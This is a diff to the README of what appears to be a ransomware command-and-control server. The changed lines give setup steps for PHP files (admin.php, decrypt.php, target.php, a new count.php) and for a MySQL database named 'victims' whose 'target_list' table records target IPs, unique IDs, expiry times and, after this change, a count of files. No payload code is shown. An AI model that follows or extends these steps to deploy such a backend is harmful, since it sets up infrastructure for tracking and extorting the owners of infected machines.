@@ -41,12 +41,12 @@
  - > You should have all of the php files in the root of your web dir (/var/www/html/)
  - > You should also have /var/www/html/images/ and /var/www/html/scripts/
  - $ cd /var/www/html/
- - > Modify admin.php, admin_query.php, decrypt.php, query.php, and target.php with your database information
+ - > Modify admin.php, admin_query.php, decrypt.php, query.php, count.php, and target.php with your database information
  - > Next, create the database for storing the data
  - $ mysql -u [user] -p
  - $ create database victims;
  - $ use victims;
- - $ create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null);
+ - $ create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), file_count int not null, curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null);
  - $ exit
 
 ## What to do on the client-side
